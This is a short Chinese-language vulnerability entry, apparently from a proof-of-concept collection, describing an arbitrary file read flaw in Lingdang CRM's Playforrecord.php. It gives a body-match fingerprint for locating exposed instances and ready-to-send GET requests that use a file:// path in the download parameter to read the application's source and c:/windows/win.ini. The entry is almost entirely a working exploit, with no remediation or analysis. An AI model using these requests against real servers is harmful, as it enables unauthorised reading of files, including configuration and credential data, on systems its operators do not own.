# 灵当CRMPlayforrecord存在任意文件读取漏洞

- **系统**：灵当　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="include/js/ldAjax.js"`
- **请求**：`GET /crm/modules/Accounts/Playforrecord.php?download=file:///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1`

**请求体 / payload**
```
GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1
Host:
```
- **预期**：200　|　—